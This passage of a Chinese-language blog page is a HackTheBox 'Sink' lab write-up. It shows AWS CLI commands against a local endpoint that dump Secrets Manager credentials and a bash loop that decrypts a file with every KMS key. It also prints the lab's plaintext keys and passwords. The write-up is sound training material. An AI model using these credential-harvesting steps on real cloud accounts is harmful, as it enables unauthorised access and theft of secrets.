class="string">'eu'</span>,</span><br><span class="line">	<span class="string">'endpoint'</span> => <span class="string">'http://127.0.0.1:4566'</span>,</span><br><span class="line">	<span class="string">'credentials'</span> => [</span><br><span class="line">		<span class="string">'key'</span> => <span class="string">'AKIAIUEN3QWCPSTEITJQ'</span>,</span><br><span class="line">		<span class="string">'secret'</span> => <span class="string">'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'</span></span><br><span class="line">	],</span><br><span class="line">	<span class="string">'version'</span> => <span class="string">'latest'</span></span><br><span class="line">]);</span><br><span class="line"><span class="keyword">try</span> {</span><br><span class="line">$client->createLogGroup(<span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'logGroupName'</span> => <span class="string">'Chef_Events'</span>,</span><br><span class="line">));</span><br><span class="line">}</span><br><span class="line"><span class="keyword">catch</span> (AwsException $e) {</span><br><span class="line">    <span class="keyword">echo</span> $e->getMessage();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">try</span> {</span><br><span class="line">$client->createLogStream([</span><br><span class="line">	<span class="string">'logGroupName'</span> => <span class="string">'Chef_Events'</span>,</span><br><span class="line">	<span class="string">'logStreamName'</span> => <span class="string">'20201120'</span></span><br><span class="line">]);</span><br><span class="line">}<span class="keyword">catch</span> (AwsException $e) {</span><br><span class="line">    <span class="keyword">echo</span> $e->getMessage();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">?></span></span><br></span></pre></td></tr></tbody></table></figure>
+
+<h3 id="AWS-CLI-Configure"><a href="#AWS-CLI-Configure" class="headerlink" title="AWS CLI Configure"></a>AWS CLI Configure</h3><p><code>Google</code>了一下<code>AWS、key、secret</code>，发现在官方指导手册中有相关介绍，可以通过<code>AWS</code>配置<code>key</code>和<code>secret</code>，从而访问关键隐私信息。官方指导手册如下：</p>
+<blockquote>
+<p><a href="https://docs.aws.amazon.com/cli/latest/index.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/cli/latest/index.html</a></p>
+<p><a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html</a></p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/07/22/8NdkXBOtziC92Sh.png" alt="image.png"></p>
+<p>我们也尝试按照官方说明配置下，只需要修改<code>key</code>和<code>secret</code>即可，<code>region</code>代表所在区域。直接按照官方默认来设置：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">marcus@sink:~$ aws configure</span><br><span class="line">AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ</span><br><span class="line">AWS Secret Access Key [None]: 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</span><br><span class="line">Default region name [None]: us-west-2</span><br><span class="line">Default output format [None]: json</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="AWS-Secretsmanager"><a href="#AWS-Secretsmanager" class="headerlink" title="AWS Secretsmanager"></a>AWS Secretsmanager</h3><p>配置完成之后可以通过<code>secretsmanager</code>列举保存的<code>secrets</code></p>
+<figure class="highlight qml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws --endpoint-<span class="built_in">url</span>=<span class="string">"http://127.0.0.1:4566/"</span> secretsmanager <span class="built_in">list</span>-secrets</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://i.loli.net/2021/07/22/KE5JCrYMh8D1sz4.png" alt="image.png"></p>
+<p>然后根据列举出的<code>secrets</code>逐个查询</p>
+<figure class="highlight dsconfig"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">aws </span><span class="built_in">--endpoint-url="http://127.0.0.1:4566/"</span> <span class="string">secretsmanager </span><span class="built_in">get-secret-value</span> <span class="built_in">--secret-id</span> <span class="string">"arn:aws:secretsmanager:us-east-1:1234567890:secret:xxxxxxx<name>"</name></span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>获得了以下内容</p>
+<p><img src="https://i.loli.net/2021/07/22/apAnVIKfxR3kyY9.png" alt="image.png"></p>
+<figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username:</span><span class="string">david@sink.htb</span>   <span class="attr">password:EALB=bcC=`a7f2#k</span></span><br><span class="line"><span class="attr">username:</span><span class="string">albert@sink.htb</span>  <span class="attr">password:Welcome123!</span></span><br><span class="line"><span class="attr">username:</span><span class="string">john@sink.htb</span>    <span class="attr">password:R);\\)ShS99mZ~8j</span></span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="User-david"><a href="#User-david" class="headerlink" title="User-david"></a>User-david</h3><p>查看<code>/etc/passwd</code>和<code>/home</code>路径，发现是存在<code>david</code>用户的，尝试了下可以成功用密码切换到<code>david</code>用户</p>
+<p><img src="https://i.loli.net/2021/07/22/T7fKgpCzs1DUNtX.png" alt="image.png"></p>
+<h2 id="0x05-AWS-Key-Management"><a href="#0x05-AWS-Key-Management" class="headerlink" title="0x05 AWS Key Management"></a>0x05 AWS Key Management</h2><h3 id="severs-enc"><a href="#severs-enc" class="headerlink" title="severs.enc"></a>severs.enc</h3><p><code>david</code>用户目录下<code>/home/david/Projects/Prod_Deployment</code>发现了一个<code>servers.enc</code>文件，显然需要解密</p>
+<p><img src="https://i.loli.net/2021/07/22/GgjapP5qrUVNYFx.png" alt="image.png"></p>
+<p>因为目录是<code>Gitea</code>项目相关的目录，猜测很可能还是需要通过AWS来解密，搜索之后发现了<code>AWS Key Management</code></p>
+<blockquote>
+<p><a href="https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html</a></p>
+<p><a href="https://docs.aws.amazon.com/kms/latest/developerguide/programming-encryption.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/kms/latest/developerguide/programming-encryption.html</a></p>
+</blockquote>
+<h3 id="list-keys"><a href="#list-keys" class="headerlink" title="list-keys"></a>list-keys</h3><p>同样使用<code>david</code>用户先按照之前的<code>AWS</code>进行配置，配置之后可以<code>list-keys</code></p>
+<figure class="highlight qml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws --endpoint-<span class="built_in">url</span>=<span class="string">"http://127.0.0.1:4566/"</span> kms <span class="built_in">list</span>-keys</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://i.loli.net/2021/07/22/F1YQmjNeGocSh4a.png" alt="image.png"></p>
+<h3 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a>decrypt</h3><p>按照国外大神的思路进行解密操作，<code>bash</code>脚本如下：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/binbash</span></span><br><span class="line"><span class="keyword">for</span> KEY <span class="keyword">in</span> $(aws --endpoint-url=<span class="string">"http://127.0.0.1:4566/"</span> kms list-keys | grep KeyId | awk -F\<span class="string">" '{ print <span class="variable">$4</span> }')</span></span><br><span class="line"><span class="string">do </span></span><br><span class="line"><span class="string">	aws --endpoint-url="</span>http://127.0.0.1:4566/<span class="string">" kms enable-key --key-id "</span><span class="variable">${KEY}</span><span class="string">"</span></span><br><span class="line"><span class="string">	aws --endpoint-url="</span>http://127.0.0.1:4566/<span class="string">" kms decrypt --key-id "</span><span class="variable">${KEY}</span><span class="string">" --ciphertext-blob "</span>fileb:///home/david/Projects/Prod_Deployment/servers.enc<span class="string">" --encryption-algorithm "</span>RSAES_OAEP_SHA_256<span class="string">" --output "</span>text<span class="string">" --query "</span>Plaintext<span class="string">"</span></span><br><span class="line"><span class="string">done</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://i.loli.net/2021/07/22/Y5VDurCoU92SWms.png" alt="image.png"></p>
+<p>得到了一串base64的字符串，推荐使用<code>CyberChef</code>进行解密，选取自己想要的模块直接拖就行，非常方便：</p>
+<blockquote>
+<p><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">https://gchq.github.io/CyberChef/</a></p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/07/22/jyUFiYuSvKGTNRl.png" alt="image.png"></p>
+<p><code>base64</code>之后需要再<code>gunzip</code>解下包，可以得到最后的秘钥：</p>
+<figure class="highlight sqf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">name</span>: <span class="built_in">admin</span></span><br><span class="line">pass: <span class="variable">_uezduQ</span>!EY5AHfe2</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://i.loli.net/2021/07/22/dHwBtEIrnOQ6k1p.png" alt="image.png"></p>
+<p>done!</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的来看，这个靶机主要涉及到了<code>HTTP</code>请求走私、<code>HAProxy HTTP request smuggling (CVE-2019-18277)</code>、<code>Gitea</code>信息泄露、<code>AWS CLI</code>配置、<code>AWS Key Management</code>等知识点，以前没搞过AWS的可以通过这个靶机好好熟悉下。另外HTTP请求走私虽然利用比较苛刻，但是也算是一个可以利用的攻击方法，需要后续在深入学习下。</p>
+<h2 id="0x06-Reference"><a href="#0x06-Reference" class="headerlink" title="0x06 Reference"></a>0x06 Reference</h2><ul>
+<li>1、<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a></li>
+<li>2、<a href="https://nathandavison.com/blog/haproxy-http-request-smuggling" target="_blank" rel="noopener">https://nathandavison.com/blog/haproxy-http-request-smuggling</a></li>
+<li>3、<a href="https://docs.aws.amazon.com/cli/latest/index.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/cli/latest/index.html</a></li>
+<li>4、<a href="https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html</a></li>
+</ul>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Hackthebox/" rel="tag"># Hackthebox</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/25/Hackthebox--Tenet/" rel="prev" title="Hackthebox--Tenet">
+      <i class="fa fa-chevron-left"></i> Hackthebox--Tenet
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-题目介绍"><span class="nav-number">1.</span> <span class="nav-text">0x00 题目介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Port-Scan"><span class="nav-number">2.</span> <span class="nav-text">0x01 Port Scan</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Port-5000-Gunicorn"><span class="nav-number">3.</span> <span class="nav-text">0x02 Port 5000 - Gunicorn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HAProxy-HTTP-request-smuggling-CVE-2019-18277"><span class="nav-number">3.1.</span> <span class="nav-text">HAProxy HTTP request smuggling (CVE-2019-18277)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#admin-cookie-steal"><span class="nav-number">3.2.</span> <span class="nav-text">admin cookie steal</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Credentials"><span class="nav-number">3.3.</span> <span class="nav-text">Credentials</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Port-3000-Gitea"><span class="nav-number">4.</span> <span class="nav-text">0x03 Port 3000 - Gitea</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#User-marcus"><span class="nav-number">4.1.</span> <span class="nav-text">User -marcus</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Privilege-Escalation"><span class="nav-number">5.</span> <span class="nav-text">0x04 Privilege Escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AWS-CLI-Configure"><span class="nav-number">5.1.</span> <span class="nav-text">AWS CLI Configure</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AWS-Secretsmanager"><span class="nav-number">5.2.</span> <span class="nav-text">AWS Secretsmanager</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#User-david"><span class="nav-number">5.3.</span> <span class="nav-text">User-david</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-AWS-Key-Management"><span class="nav-number">6.</span> <span class="nav-text">0x05 AWS Key Management</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#severs-enc"><span class="nav-number">6.1.</span> <span class="nav-text">severs.enc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#list-keys"><span class="nav-number">6.2.</span> <span class="nav-text">list-keys</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#decrypt"><span class="nav-number">6.3.</span> <span class="nav-text">decrypt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">6.4.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Reference"><span class="nav-number">7.</span> <span class="nav-text">0x06 Reference</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">P0tato</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">P0tato</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
